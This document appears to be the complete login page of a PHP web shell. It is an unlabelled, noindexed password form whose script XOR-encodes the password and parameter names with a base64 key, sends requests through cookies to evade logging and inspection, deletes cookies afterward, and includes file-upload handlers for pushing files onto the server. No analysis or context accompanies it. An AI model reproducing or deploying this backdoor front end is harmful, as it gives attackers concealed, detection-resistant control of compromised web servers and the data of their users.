<html>
<head>
	<meta name="robots" content="noindex">
</head>
<body style="background:#f0f0f0;display:grid;height:100vh;margin:0;place-items:center center;">
	<form action="" method="POST" onsubmit="return login(this)">
		<input style="text-align: center" name="pass" type="password" value="">
	</form>
</body>
<script>
		var ENCKEY = atob("T1RZek5qTTFZamszT0RnMk56Y3lPR0V6TURaak9UTXpPRGxqTVRObFpEVTRPVFV4TXpkaU1HRXdNRGhqWVdJME9XTmhZMlJoTWpFd09EZ3lZakF5TTJGbVptSXpZMlkzTURrek56WTVPRFJoTXpZek1UUTBZVFU0TUdVMU1tWmlaalV6TkRjM01UazFOVE0xT0dJME1qTXlNMkl5TURObU9XRXlORFJtTXpJPQ=="); 
		var PRELEN = 7;
		var COOKIE = 1;

		
		startEventsListners();
		if(COOKIE){
			if(ci = document.getElementById("cbCO"))
				ci.checked = "on";
			deleteAllCookies();
		}

		function startEventsListners(){
			var elements = document.getElementsByTagName("*");
		
			for(var i=0;i<elements.length;i++){

				if(elements[i].type && elements[i].type == "file")
						elements[i].onchange = function(e){
							if(!elmById("cbRR").checked) prepareFile(this)
							else uplFiles();
						}
					
			}
		}
				
		function bin2hex(bin){
		  var hex = "";
		  for(var i = 0; i<bin.length; i++){
		    var c = bin.charCodeAt(i);
		    if (c>0xFF) c -= 0x350;
		    hex += (c.toString(16).length === 1 ? "0" : "") + c.toString(16);
		  }
		  return hex;
		}
		
		function login(form){
			addEncKey(form);
			form.pass.value = setValue(form.pass.value);
			form.pass.name = setName(form.pass.name);
			
			if(COOKIE)
				submitViaCookie(form);
			else
				return true;
				
			return false;
		}
		  
		function hex2bin(hex) {
		  var bin = "";
		  for (var i=0; i<hex.length; i=i+2) {
		    var c = parseInt(""+hex[i]+hex[i+1], 16);
		    if (c>0x7F) c += 0x350;
		    bin += String.fromCharCode(c);
		  }
		  return bin;
		}
			
		function xorStr(str, decode = false) {
			str = (!decode ? encodeURIComponent(str) : str);
			str = str.split("");
		    key = ENCKEY.split("");
		    var str_len = str.length;
		    var key_len = key.length;
		
		    var String_fromCharCode = String.fromCharCode;
		
		    for(var i = 0; i < str_len; i++) {
		        str[i] = String_fromCharCode(str[i].charCodeAt(0) ^ key[i % key_len].charCodeAt(0));
		    }
		    str = str.join("");
		    
		    if(decode){ 
				try{
					str = decodeURIComponent(str);
				}
				catch(e){
					str = unescape(str);
				}
			}

		    return str;
		}
		
		function setName(str){
			str = bin2hex(xorStr(str));
			pref = ENCKEY.substr(0, PRELEN);
			return pref + str;
		}
		
		function setValue(str){
			return btoa(xorStr(str));
		}
		
		function getValue(str){
			return xorStr(atob(str), true);
		}
		
		function addEncKey(form){
			var encKey = document.createElement("input");
			encKey.type = "hidden";
			pref = ENCKEY.substr(0, PRELEN);
			encKey.name = pref.split("").reverse().join("") + pref;
			encKey.value = btoa(ENCKEY);
			form.appendChild(encKey);
			return form;
		}
		
		function fixFileName(str, len = false){
			str = str.split(/(\\|\/)/g).pop();
			if(len) str = str.substring(0, len);
			return str;
		}
		
		function getParentFormOf(element){
			
			while(element.tagName != "FORM")
				element = element.parentElement;

			return element;
		}
		
		function prepareFile(input){
			var file = input;
			form = getParentFormOf(input);
			form.enctype = "application/x-www-form-urlencoded";
			
			if(file.files.length){
				var reader = new FileReader();
				
				reader.onload = function(e){
						filename = fixFileName(input.value);
						wwwFile = document.createElement("input");
						wwwFile.type = "hidden";
						wwwFile.id = input.name;
						wwwFile.name = input.name + "["+filename+"]";
						wwwFile.value = e.target.result;
						if(e.target.result.length <= 2097152)
							form.appendChild(wwwFile);
						else
							if(confirm("Request size is ~" + Math.round(((e.target.result.length * 2) / 1024) / 1024) + "M, but limits is often around <= 8M. There is no guarantee that the file will be uploaded.\nYou can disable request encoding, use other upload methods or select a smaller file. Continue?"))
								form.appendChild(wwwFile);
							else
								return false;
							
						uplFiles();
						
						elements = form.getElementsByTagName("*");
						for(var i = 0; i < elements.length; i++)
							if(elements[i].type === "hidden")
								form.removeChild(elements[i]);
				};
				
				reader.readAsDataURL(file.files[0]);
				return reader;
			}
			
		}

		function deleteAllCookies() {	
			var cookies = document.cookie.split(";");
		
			for (var i = 0; i < cookies.length; i++) {
				var cookie = cookies[i];
				var eqPos = cookie.indexOf("=");
				var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
				document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
			}
			
			return false;
		}
	
		function submitViaCookie(encodedForm, refresh = true){
			var reqlen = 0;
			var elements = encodedForm.getElementsByTagName("*");
			
			for(i = 0; i < elements.length; i++) {
				
				if(!elements[i].name) continue;
				
				name = elements[i].name;
				value = encodeURIComponent(elements[i].value);

				if(value.length > 4095 || reqlen > 7696){
					if(confirm("The request header is too big, send it via POST?")){
						deleteAllCookies();
						return false;
					}
					else{
						deleteAllCookies();
						return "CANCEL";
					}
				}
				
				document.cookie =  name + "=" + value;
				reqlen = reqlen + name.length + value.length;
			}
			
			if(refresh)
				window.location = window.location.pathname;
			else
				return "SEND";
		}
		
		function invertColors() {
		    var css = "html{-webkit-filter: invert(90%); -moz-filter: invert(90%); -o-filter: invert(90%); -ms-filter: invert(90%);}";
		    var head = document.getElementsByTagName("head")[0];
		    var style = document.createElement("style");
		    if(!window.counter)
		        window.counter = 1;
		    else{
		        window.counter++;
		        if (window.counter % 2 == 0)
		            var css = "html{-webkit-filter: invert(0%); -moz-filter: invert(0%); -o-filter: invert(0%); -ms-filter: invert(0%);}"
		    }
		    style.type = "text/css";
		    
		    if(style.styleSheet)
		        style.styleSheet.cssText = css;
		    else
		        style.appendChild(document.createTextNode(css));
		        
		    head.appendChild(style);
		    
		    return false;
		}
</script>
</html>